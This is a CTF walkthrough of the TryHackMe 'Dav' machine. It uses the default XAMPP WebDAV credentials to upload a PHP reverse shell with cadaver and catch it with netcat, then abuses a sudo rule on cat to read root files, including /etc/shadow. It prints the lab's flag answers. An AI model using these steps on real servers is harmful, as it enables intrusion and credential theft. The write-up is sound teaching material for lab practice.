---
title: "Dav"
description: "A boot2root CTF machine exploiting a misconfigured WebDAV server with default credentials to upload a reverse shell, then escalating via a sudo misconfiguration."
difficulty: "Easy"
tags: ["WebDAV", "Apache", "Reverse Shell", "Privilege Escalation", "XAMPP"]
date: "2026-07-04"
---

## Overview

Dav is a TryHackMe boot2root machine from the FIT & BSides Guatemala CTF. The target runs Apache with WebDAV enabled using default credentials, allowing an attacker to upload a PHP reverse shell. Privilege escalation is trivial — the `www-data` user can run `/bin/cat` as root without a password.

## Room Information

- **Platform:** TryHackMe
- **Difficulty:** Easy
- **Skills Learned:** WebDAV enumeration, default credentials, reverse shell upload, sudo privilege escalation

## Enumeration

### Nmap Scan

```bash
nmap -sV -sC -oN nmap.txt 10.48.157.14
```

Only a single port was open:

| Port | Service | Version |
|------|---------|---------|
| 80/tcp | HTTP | Apache 2.4.18 (Ubuntu) |

The Apache default page was displayed. No other ports or services were exposed.

### Directory Brute-Forcing

Ran Gobuster to discover hidden directories:

```bash
gobuster dir -u http://10.48.157.14 -w /usr/share/wordlists/dirb/common.txt
```

Found `/webdav` returning a **401 Unauthorized** status — it required HTTP Basic Authentication.

### WebDAV Discovery

WebDAV (Web Distributed Authoring and Versioning) is an HTTP extension that allows users to create, modify, and move files on a web server. The `/webdav` directory is a common feature in XAMPP installations, which ship with default credentials.

A quick search reveals the default WebDAV credentials for XAMPP:

- **Username:** `wampp`
- **Password:** `xampp`

Logging in revealed a single file: `passwd.dav`, containing a hashed password:

```bash
wampp:$apr1$Wm2VTkFL$PVNRQv7kzqXQIHe14qKA91
```

This hash uses Apache's `$apr1$` MD5-based algorithm. While it could be cracked, the default credentials already provide write access to the WebDAV directory — so uploading a shell is the more direct path.

## Exploitation

### Uploading a Reverse Shell with Cadaver

`cadaver` is a command-line WebDAV client for Unix. Used it to connect and upload a PHP reverse shell:

```bash
cadaver http://10.48.157.14/webdav
# Username: wampp
# Password: xampp
dav:/webdav/> put /path/to/reverse-shell.php shell.php
```

The PHP reverse shell (from pentestmonkey) was configured with the attacker's IP and port.

### Triggering the Shell

Started a netcat listener:

```bash
nc -lvnp 9001
```

Visited the uploaded script in a browser:

```
http://10.48.157.14/webdav/shell.php
```

The connection came back as `www-data`.

### User Flag

```bash
www-data@ubuntu:/$ cat /home/merlin/user.txt
449b40fe93f78a938523b7e4dcd66d2a
```

## Privilege Escalation

### Checking Sudo Permissions

```bash
www-data@ubuntu:/$ sudo -l
```

Output:

```
User www-data may run the following commands on ubuntu:
    (ALL) NOPASSWD: /bin/cat
```

The `www-data` user could run `/bin/cat` as root with no password required.

### Reading the Root Flag

```bash
www-data@ubuntu:/$ sudo cat /root/root.txt
101101ddc16b0cdf65ba0b8a7af7afa5
```

This same technique could be used to read any file on the system, including `/etc/shadow`, SSH private keys, or other sensitive data.

## Flags

| Flag | Value |
|------|-------|
| User | `449b40fe93f78a938523b7e4dcd66d2a` |
| Root | `101101ddc16b0cdf65ba0b8a7af7afa5` |

## Commands Used

```bash
nmap -sV -sC -oN nmap.txt <target-ip>
gobuster dir -u http://<target-ip> -w /usr/share/wordlists/dirb/common.txt
cadaver http://<target-ip>/webdav
dav:/webdav/> put shell.php
nc -lvnp 9001
sudo cat /root/root.txt
```

## Lessons Learned

- **Default credentials** are the entry point. XAMPP's WebDAV ships with `wampp:xampp` — always change these in production.
- **WebDAV** is a powerful feature that, when misconfigured, allows arbitrary file uploads. This can lead directly to remote code execution.
- **Always check `sudo -l`** immediately after gaining access. A single misconfigured sudo entry — even for a seemingly harmless command like `cat` — can completely compromise a system.
- **Cadaver** is an essential tool for interacting with WebDAV servers from the command line.

## References

- [TryHackMe — Dav](https://tryhackme.com/room/bsidesgtdav)
- [Exploiting WebDAV](https://vk9-sec.com/exploiting-webdav/)
- [GTFOBins — cat](https://gtfobins.github.io/gtfobins/cat/)
- [PentestMonkey PHP Reverse Shell](https://github.com/pentestmonkey/php-reverse-shell)
